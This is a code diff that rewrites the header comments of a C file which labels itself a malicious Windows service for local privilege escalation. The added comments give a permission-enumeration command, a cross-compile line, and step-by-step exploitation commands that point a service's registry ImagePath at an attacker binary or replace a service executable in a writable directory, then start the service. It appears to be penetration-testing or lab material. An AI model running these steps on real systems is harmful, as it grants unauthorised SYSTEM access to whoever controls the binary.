@@ -1,8 +1,18 @@
-// This is a malicious windows service that can be added if the "HKLM\\System\\CurrentControlSet\\Services\\regscv" key is accessible to the low level user
+// This is a malicious windows service that can be added 
 
 // Enumerate with: powershell.exe -command "Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl" 
 
 // Cross compile with: x86_64-w64-mingw32-gcc windows_service.c -o exploit.exe
+
+/*
+ * Exploitation:
+ * 	- if the "HKLM\\System\\CurrentControlSet\\Services\\regscv" key is accessible to the low level user:
+ * 		- reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\service.exe /f
+ * 		- sc start <service-name>
+ * 	- if a service executable is in a writable directory:
+ * 		- compile this service with the same service name as the service being replaced
+ * 		- sc start <replaced-service>
+ * */
 
 #include <windows.h>
 #include <stdio.h>
